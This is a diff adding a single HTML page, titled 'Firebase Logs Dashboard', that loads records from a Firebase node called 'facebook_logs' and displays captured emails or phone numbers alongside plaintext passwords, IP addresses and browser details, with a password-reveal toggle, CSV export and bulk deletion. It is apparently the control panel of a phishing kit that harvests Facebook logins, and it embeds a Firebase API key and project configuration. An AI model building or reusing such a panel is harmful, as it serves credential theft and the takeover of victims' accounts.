@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Firebase Logs Dashboard</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f5f7fa;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 20px 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 1.8em;
+            font-weight: bold;
+        }
+
+        .stats {
+            display: flex;
+            gap: 30px;
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-number {
+            font-size: 1.5em;
+            font-weight: bold;
+            display: block;
+        }
+
+        .stat-label {
+            font-size: 0.9em;
+            opacity: 0.9;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .controls {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .search-box {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .search-box input {
+            padding: 10px 15px;
+            border: 2px solid #e1e5e9;
+            border-radius: 8px;
+            font-size: 1em;
+            min-width: 250px;
+        }
+
+        .search-box input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1em;
+            font-weight: 500;
+            transition: all 0.3s ease;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
+        }
+
+        .btn-danger {
+            background: #e74c3c;
+            color: white;
+        }
+
+        .btn-danger:hover {
+            background: #c0392b;
+        }
+
+        .btn-success {
+            background: #27ae60;
+            color: white;
+        }
+
+        .btn-success:hover {
+            background: #219a52;
+        }
+
+        .logs-container {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+
+        .logs-header {
+            background: #f8f9fa;
+            padding: 20px;
+            border-bottom: 2px solid #e9ecef;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logs-title {
+            font-size: 1.3em;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .log-item {
+            padding: 20px;
+            border-bottom: 1px solid #e9ecef;
+            transition: all 0.3s ease;
+        }
+
+        .log-item:hover {
+            background: #f8f9fa;
+        }
+
+        .log-item:last-child {
+            border-bottom: none;
+        }
+
+        .log-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .log-id {
+            font-weight: 600;
+            color: #667eea;
+        }
+
+        .log-timestamp {
+            color: #6c757d;
+            font-size: 0.9em;
+        }
+
+        .log-details {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+
+        .detail-item {
+            background: #f8f9fa;
+            padding: 10px 15px;
+            border-radius: 8px;
+            border-left: 4px solid #667eea;
+        }
+
+        .detail-label {
+            font-weight: 600;
+            color: #333;
+            font-size: 0.9em;
+            margin-bottom: 5px;
+        }
+
+        .detail-value {
+            color: #555;
+            word-break: break-all;
+        }
+
+        .password-field {
+            position: relative;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #667eea;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 40px;
+            color: #6c757d;
+        }
+
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .no-logs {
+            text-align: center;
+            padding: 40px;
+            color: #6c757d;
+        }
+
+        .no-logs i {
+            font-size: 3em;
+            margin-bottom: 15px;
+            color: #dee2e6;
+        }
+
+        .export-options {
+            display: flex;
+            gap: 10px;
+        }
+
+        .status-indicator {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #28a745;
+            margin-right: 8px;
+        }
+
+        @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                gap: 15px;
+            }
+
+            .stats {
+                gap: 20px;
+            }
+
+            .controls {
+                flex-direction: column;
+                align-items: stretch;
+            }
+
+            .search-box {
+                flex-direction: column;
+            }
+
+            .search-box input {
+                min-width: 100%;
+            }
+
+            .log-details {
+                grid-template-columns: 1fr;
+            }
+
+            .export-options {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-content">
+            <div class="logo">
+                <i class="fas fa-database"></i> Firebase Logs Dashboard
+            </div>
+            <div class="stats">
+                <div class="stat-item">
+                    <span class="stat-number" id="totalLogs">0</span>
+                    <span class="stat-label">Total Logs</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-number" id="todayLogs">0</span>
+                    <span class="stat-label">Today</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-number" id="uniqueIPs">0</span>
+                    <span class="stat-label">Unique IPs</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="controls">
+            <div class="search-box">
+                <input type="text" id="searchInput" placeholder="Search logs by email, IP, or any field...">
+                <button class="btn btn-primary" onclick="searchLogs()">
+                    <i class="fas fa-search"></i> Search
+                </button>
+            </div>
+            <div class="export-options">
+                <button class="btn btn-success" onclick="exportToCSV()">
+                    <i class="fas fa-download"></i> Export CSV
+                </button>
+                <button class="btn btn-primary" onclick="refreshLogs()">
+                    <i class="fas fa-sync"></i> Refresh
+                </button>
+                <button class="btn btn-danger" onclick="clearAllLogs()">
+                    <i class="fas fa-trash"></i> Clear All
+                </button>
+            </div>
+        </div>
+
+        <div class="logs-container">
+            <div class="logs-header">
+                <div class="logs-title">
+                    <span class="status-indicator"></span>
+                    Recent Login Attempts
+                </div>
+                <div id="lastUpdated" class="log-timestamp">
+                    Last updated: Never
+                </div>
+            </div>
+            
+            <div id="loadingIndicator" class="loading">
+                <div class="spinner"></div>
+                <p>Loading logs from Firebase...</p>
+            </div>
+
+            <div id="logsContent"></div>
+        </div>
+    </div>
+
+    <!-- Firebase CDN -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/9.22.1/firebase-app-compat.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/9.22.1/firebase-database-compat.min.js"></script>
+
+    <script>
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyC4hshdUKSUqKMtotgKArIQdii0KkV33WY",
+            authDomain: "test-2361c.firebaseapp.com",
+            databaseURL: "https://test-2361c-default-rtdb.firebaseio.com",
+            projectId: "test-2361c",
+            storageBucket: "test-2361c.firebasestorage.app",
+            messagingSenderId: "82627959916",
+            appId: "1:82627959916:web:00e97cbec9151a1ec44c49",
+            measurementId: "G-3BCZXNEXS4"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        let allLogs = [];
+        let filteredLogs = [];
+
+        // Load logs from Firebase
+        function loadLogs() {
+            document.getElementById('loadingIndicator').style.display = 'block';
+            document.getElementById('logsContent').innerHTML = '';
+
+            database.ref('facebook_logs').once('value')
+                .then(snapshot => {
+                    const data = snapshot.val();
+                    allLogs = [];
+                    
+                    if (data) {
+                        Object.keys(data).forEach(key => {
+                            allLogs.push({
+                                id: key,
+                                ...data[key]
+                            });
+                        });
+                        
+                        // Sort by timestamp (newest first)
+                        allLogs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+                    }
+                    
+                    filteredLogs = [...allLogs];
+                    updateStats();
+                    displayLogs();
+                    updateLastUpdated();
+                })
+                .catch(error => {
+                    console.error('Error loading logs:', error);
+                    document.getElementById('logsContent').innerHTML = '<div class="no-logs"><i class="fas fa-exclamation-triangle"></i><h3>Error loading logs</h3><p>Please check your Firebase configuration.</p></div>';
+                })
+                .finally(() => {
+                    document.getElementById('loadingIndicator').style.display = 'none';
+                });
+        }
+
+        // Display logs
+        function displayLogs() {
+            const logsContent = document.getElementById('logsContent');
+            
+            if (filteredLogs.length === 0) {
+                logsContent.innerHTML = '<div class="no-logs"><i class="fas fa-inbox"></i><h3>No logs found</h3><p>No login attempts have been recorded yet.</p></div>';
+                return;
+            }
+
+            let html = '';
+            filteredLogs.forEach(log => {
+                const date = new Date(log.timestamp);
+                const formattedDate = date.toLocaleString();
+                
+                html += `
+                    <div class="log-item">
+                        <div class="log-header">
+                            <div class="log-id">#${log.id.substring(0, 8)}</div>
+                            <div class="log-timestamp">${formattedDate}</div>
+                        </div>
+                        <div class="log-details">
+                            <div class="detail-item">
+                                <div class="detail-label">Email/Phone</div>
+                                <div class="detail-value">${log.email || 'N/A'}</div>
+                            </div>
+                            <div class="detail-item">
+                                <div class="detail-label">Password</div>
+                                <div class="detail-value password-field">
+                                    <span class="password-text" data-password="${log.password || 'N/A'}">••••••••••</span>
+                                    <button class="password-toggle" onclick="togglePassword(this)">
+                                        <i class="fas fa-eye"></i>
+                                    </button>
+                                </div>
+                            </div>
+                            <div class="detail-item">
+                                <div class="detail-label">IP Address</div>
+                                <div class="detail-value">${log.ip || 'N/A'}</div>
+                            </div>
+                            <div class="detail-item">
+                                <div class="detail-label">User Agent</div>
+                                <div class="detail-value">${log.userAgent || 'N/A'}</div>
+                            </div>
+                            <div class="detail-item">
+                                <div class="detail-label">Platform</div>
+                                <div class="detail-value">${log.platform || 'N/A'}</div>
+                            </div>
+                            <div class="detail-item">
+                                <div class="detail-label">Language</div>
+                                <div class="detail-value">${log.language || 'N/A'}</div>
+                            </div>
+                            <div class="detail-item">
+                                <div class="detail-label">Referrer</div>
+                                <div class="detail-value">${log.referrer || 'Direct'}</div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            });
+            
+            logsContent.innerHTML = html;
+        }
+
+        // Update statistics
+        function updateStats() {
+            const totalLogs = allLogs.length;
+            const today = new Date().toDateString();
+            const todayLogs = allLogs.filter(log => new Date(log.timestamp).toDateString() === today).length;
+            const uniqueIPs = new Set(allLogs.map(log => log.ip)).size;
+
+            document.getElementById('totalLogs').textContent = totalLogs;
+            document.getElementById('todayLogs').textContent = todayLogs;
+            document.getElementById('uniqueIPs').textContent = uniqueIPs;
+        }
+
+        // Search logs
+        function searchLogs() {
+            const searchTerm = document.getElementById('searchInput').value.toLowerCase();
+            
+            if (!searchTerm) {
+                filteredLogs = [...allLogs];
+            } else {
+                filteredLogs = allLogs.filter(log => 
+                    Object.values(log).some(value => 
+                        value && value.toString().toLowerCase().includes(searchTerm)
+                    )
+                );
+            }
+            
+            displayLogs();
+        }
+
+        // Toggle password visibility
+        function togglePassword(button) {
+            const passwordText = button.previousElementSibling;
+            const icon = button.querySelector('i');
+            
+            if (passwordText.textContent === '••••••••••') {
+                passwordText.textContent = passwordText.getAttribute('data-password');
+                icon.className = 'fas fa-eye-slash';
+            } else {
+                passwordText.textContent = '••••••••••';
+                icon.className = 'fas fa-eye';
+            }
+        }
+
+        // Export to CSV
+        function exportToCSV() {
+            if (filteredLogs.length === 0) {
+                alert('No logs to export');
+                return;
+            }
+
+            const headers = ['ID', 'Email', 'Password', 'IP', 'Timestamp', 'User Agent', 'Platform', 'Language', 'Referrer'];
+            const csvContent = [
+                headers.join(','),
+                ...filteredLogs.map(log => [
+                    log.id,
+                    `"${log.email || ''}"`,
+                    `"${log.password || ''}"`,
+                    log.ip || '',
+                    log.timestamp || '',
+                    `"${log.userAgent || ''}"`,
+                    log.platform || '',
+                    log.language || '',
+                    `"${log.referrer || ''}"`
+                ].join(','))
+            ].join('\n');
+
+            const blob = new Blob([csvContent], { type: 'text/csv' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `facebook_logs_${new Date().toISOString().split('T')[0]}.csv`;
+            a.click();
+            window.URL.revokeObjectURL(url);
+        }
+
+        // Refresh logs
+        function refreshLogs() {
+            loadLogs();
+        }
+
+        // Clear all logs
+        function clearAllLogs() {
+            if (confirm('Are you sure you want to delete all logs? This action cannot be undone.')) {
+                database.ref('facebook_logs').remove()
+                    .then(() => {
+                        allLogs = [];
+                        filteredLogs = [];
+                        updateStats();
+                        displayLogs();
+                        updateLastUpdated();
+                        alert('All logs have been cleared successfully.');
+                    })
+                    .catch(error => {
+                        console.error('Error clearing logs:', error);
+                        alert('Error clearing logs. Please try again.');
+                    });
+            }
+        }
+
+        // Update last updated timestamp
+        function updateLastUpdated() {
+            document.getElementById('lastUpdated').textContent = `Last updated: ${new Date().toLocaleString()}`;
+        }
+
+        // Search on Enter key
+        document.getElementById('searchInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                searchLogs();
+            }
+        });
+
+        // Load logs on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            loadLogs();
+            
+            // Auto-refresh every 30 seconds
+            setInterval(loadLogs, 30000);
+        });
+    </script>
+</body>
+</html>
